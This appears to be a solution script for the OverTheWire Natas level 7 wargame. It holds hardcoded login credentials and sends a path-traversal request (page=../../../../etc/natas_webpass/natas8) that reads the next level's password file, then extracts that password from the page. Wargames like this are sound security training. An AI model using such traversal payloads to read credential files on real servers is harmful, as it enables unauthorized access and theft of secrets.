import requests
import re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = f'http://{username}.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'

response = requests.get(url, auth = (username, password))
content = response.text

print(re.findall('<br>\n(.*)\n\n<!--', content)[0])